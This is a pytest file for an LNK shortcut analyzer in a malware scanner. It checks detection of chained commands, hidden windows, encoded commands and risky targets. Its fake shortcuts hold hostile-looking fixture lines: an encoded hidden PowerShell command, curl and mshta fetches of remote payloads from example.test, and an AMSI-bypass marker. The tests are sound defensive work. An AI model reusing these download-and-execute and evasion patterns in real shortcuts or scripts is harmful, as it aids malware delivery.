"""Tests for LNK analyzer behavior."""

from __future__ import annotations

import base64
import struct
from pathlib import Path
from typing import Any, cast

import malscan_worker.analyzers.lnk_analyzer as lnk_module
import pytest
from malscan_worker.analyzers.lnk_analyzer import LNKAnalyzer
from malscan_worker.stages.base import StageContext

_LNK_HEADER_CLSID = bytes.fromhex("0114020000000000c000000000000046")


def _ctx(file_path: Path) -> StageContext:
    return StageContext(
        job_id="job-1",
        file_id="file-1",
        storage_key="key",
        sha256="0" * 64,
        original_filename=file_path.name,
        file_path=file_path,
    )


def _build_lnk_header(
    *,
    file_attributes: int = 0x20,
    file_size: int = 0,
    show_command: int = 1,
    hot_key: int = 0,
    creation_time: int = 0,
    access_time: int = 0,
    write_time: int = 0,
) -> bytes:
    header = bytearray(76)
    header[0:4] = struct.pack("<I", 0x4C)
    header[4:20] = _LNK_HEADER_CLSID
    header[20:24] = struct.pack("<I", 0)
    header[24:28] = struct.pack("<I", file_attributes)
    header[28:36] = struct.pack("<Q", creation_time)
    header[36:44] = struct.pack("<Q", access_time)
    header[44:52] = struct.pack("<Q", write_time)
    header[52:56] = struct.pack("<I", file_size)
    header[60:64] = struct.pack("<I", show_command)
    header[64:66] = struct.pack("<H", hot_key)
    return bytes(header)


def test_can_handle_by_magic_and_mime(tmp_path: Path) -> None:
    file_path = tmp_path / "sample.lnk"
    file_path.write_bytes(b"not-used")

    analyzer = LNKAnalyzer()

    assert analyzer.can_handle(file_path, "application/x-ms-shortcut", b"abcd") is True
    assert analyzer.can_handle(file_path, "application/x-ms-lnk", b"abcd") is True
    assert analyzer.can_handle(file_path, "application/octet-stream", _build_lnk_header()) is True


def test_can_handle_rejects_non_lnk(tmp_path: Path) -> None:
    file_path = tmp_path / "plain.bin"
    file_path.write_bytes(b"hello")

    analyzer = LNKAnalyzer()

    assert analyzer.can_handle(file_path, "text/plain", b"hello") is False


def test_default_parser_binding_resolves_lnkparse3_api() -> None:
    parser_symbol = cast(Any, getattr(lnk_module, "_lnk_file_class", None))
    assert parser_symbol is not None


@pytest.mark.asyncio
async def test_corrupt_truncated_lnk_returns_partial_with_errors(tmp_path: Path) -> None:
    file_path = tmp_path / "truncated.lnk"
    file_path.write_bytes(b"L\x00\x00")

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    assert result.analyzer_name == "lnk"
    assert result.format_type == "LNK"
    assert result.errors
    assert "header" in result.errors[0].lower() or "parse" in result.errors[0].lower()
    assert "file_size" in result.features
    assert result.risk_score >= 0


@pytest.mark.asyncio
async def test_indicator_logic_cmd_chain_encoded_and_hidden(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "encoded.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=0))

    payload = "Write-Output PWNED".encode("utf-16le")
    encoded = base64.b64encode(payload).decode("ascii")

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            self.arguments = f"-enc {encoded} && whoami -w hidden"
            self.working_dir = r"%APPDATA%\\Temp"
            self.icon_location = r"C:\\Windows\\System32\\shell32.dll,1"
            self.relative_path = r"..\\..\\payload.ps1"
            self.description = "test"
            self.network_path = ""
            self.local_base_path = r"C:\\Users\\Public"
            self.file_size = 123
            self.file_attributes = 0x20
            self.show_command = 0
            self.hot_key = 0
            self.tracker_data = {"machine_id": "abc"}

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    types = {str(ind["type"]) for ind in result.indicators}
    assert "cmd_chain" in types
    assert "encoded_command" in types
    assert "hidden_execution" in types
    assert result.features.get("decoded_command") == "Write-Output PWNED"
    heuristic_map = {heuristic.key: heuristic for heuristic in result.heuristics}
    assert "script.encoded_command_execution" in heuristic_map
    assert heuristic_map["script.encoded_command_execution"].scope == "lnk"


@pytest.mark.asyncio
async def test_cmd_chain_with_scripting_engine_and_args_without_operators(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "engine-args.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=1))

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Windows\\System32\\cmd.exe"
            self.arguments = r"/c whoami"
            self.working_dir = r"C:\\Windows\\System32"
            self.icon_location = ""
            self.relative_path = ""
            self.description = ""
            self.network_path = ""
            self.local_base_path = r"C:\\Windows\\System32"

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    indicator_types = {str(ind["type"]) for ind in result.indicators}
    assert "cmd_chain" in indicator_types


@pytest.mark.asyncio
async def test_hidden_execution_detected_for_show_command_7(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "show7.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=7))

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Windows\\System32\\cmd.exe"
            self.arguments = "/c echo ok"
            self.show_command = 7

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    indicators = {str(ind["type"]): ind for ind in result.indicators}
    assert "hidden_execution" in indicators
    assert str(indicators["hidden_execution"]["severity"]) == "high"


@pytest.mark.asyncio
async def test_long_arguments_threshold_over_500(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "longargs.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=1))
    long_args = "A" * 501

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Windows\\System32\\notepad.exe"
            self.arguments = long_args

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    indicator_types = {str(ind["type"]) for ind in result.indicators}
    assert "long_arguments" in indicator_types


@pytest.mark.asyncio
async def test_suspicious_target_location_path(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "target-location.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=1))

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Users\\alice\\Downloads\\viewer.exe"
            self.arguments = ""

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    indicator_types = {str(ind["type"]) for ind in result.indicators}
    assert "suspicious_target" in indicator_types


@pytest.mark.asyncio
async def test_fallback_exposes_top_level_timestamps(tmp_path: Path) -> None:
    file_path = tmp_path / "fallback-ts.lnk"
    file_path.write_bytes(
        _build_lnk_header(
            creation_time=132271296000000000,
            access_time=132271296100000000,
            write_time=132271296200000000,
        )
    )

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    assert "creation_time" in result.features
    assert "access_time" in result.features
    assert "modification_time" in result.features
    assert isinstance(result.features["creation_time"], str)
    assert isinstance(result.features["access_time"], str)
    assert isinstance(result.features["modification_time"], str)


@pytest.mark.asyncio
async def test_monkeypatched_lnkparse3_parse_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    file_path = tmp_path / "network.lnk"
    file_path.write_bytes(_build_lnk_header(file_size=42, show_command=1))

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"cmd.exe"
            self.arguments = "/c curl http://example.test/a"
            self.working_dir = r"C:\\Users\\Public"
            self.icon_location = r"C:\\Windows\\System32\\shell32.dll,3"
            self.relative_path = r"cmd.exe"
            self.description = "network"
            self.network_path = r"\\server\\share\\payload.exe"
            self.local_base_path = r"C:\\Temp"
            self.tracker_data = {"droid": "x"}

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    assert result.features["target_path"] == "cmd.exe"
    assert result.features["network_path"] == r"\\server\\share\\payload.exe"
    assert result.features["text_preview"] == (
        "cmd.exe /c curl http://example.test/a\n"
        "cmd.exe\n"
        r"C:\\Users\\Public"
        "\n"
        r"\\server\\share\\payload.exe"
    )
    assert result.features["download_operations"] == ["curl_or_wget"]
    assert result.features["exec_operations"] == []
    indicator_types = {str(ind["type"]) for ind in result.indicators}
    assert "network_target" in indicator_types
    assert "download_command" in indicator_types
    heuristic_map = {heuristic.key: heuristic for heuristic in result.heuristics}
    assert "script.download_execute_chain" not in heuristic_map


@pytest.mark.asyncio
async def test_lnk_downloader_without_post_download_execution_does_not_emit_download_execute_chain(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "download-only.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=1))

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Windows\\System32\\cmd.exe"
            self.arguments = r"/c curl http://example.test/payload.exe"
            self.working_dir = r"C:\\Users\\Public"
            self.network_path = ""

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    heuristic_keys = {heuristic.key for heuristic in result.heuristics}
    assert "script.download_execute_chain" not in heuristic_keys
    assert result.features["download_operations"] == ["curl_or_wget"]
    assert result.features["exec_operations"] == []


@pytest.mark.asyncio
async def test_lnk_analyze_emits_lolbin_heuristic_from_command_chain(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "lolbin.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=1))

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Windows\\System32\\mshta.exe"
            self.arguments = r"https://example.test/payload.hta"

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    heuristic_map = {heuristic.key: heuristic for heuristic in result.heuristics}
    assert "lolbin.execution_chain" in heuristic_map
    assert heuristic_map["lolbin.execution_chain"].scope == "lnk"


@pytest.mark.asyncio
async def test_lnk_heuristics_use_full_projected_text_beyond_preview_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "late-marker.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=1))

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Windows\\System32\\cmd.exe"
            self.arguments = "/c " + ("A" * 1005) + " System.Management.Automation.AmsiUtils"
            self.working_dir = ""
            self.network_path = ""
            self.description = ""
            self.relative_path = ""
            self.icon_location = ""
            self.local_base_path = ""

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    heuristic_keys = {heuristic.key for heuristic in result.heuristics}
    assert len(str(result.features["text_preview"])) == 1000
    assert "script.amsi_bypass" in heuristic_keys


@pytest.mark.asyncio
async def test_lnk_projected_encoded_strings_detect_non_enc_markers(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "encoded-projected.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=1))
    encoded = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ=="

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            self.arguments = (
                "$x=[Convert]::FromBase64String('" + encoded + "'); Start-Process calc.exe"
            )
            self.working_dir = ""
            self.network_path = ""
            self.description = ""
            self.relative_path = ""
            self.icon_location = ""
            self.local_base_path = ""

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    assert result.features["encoded_strings"] == [
        encoded,
        "[convert]::frombase64string",
        "frombase64string",
    ]
    heuristic_map = {heuristic.key: heuristic for heuristic in result.heuristics}
    assert "script.encoded_command_execution" in heuristic_map
    assert heuristic_map["script.encoded_command_execution"].evidence["encoded_strings"] == (
        "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==",
        "[convert]::frombase64string",
        "frombase64string",
    )
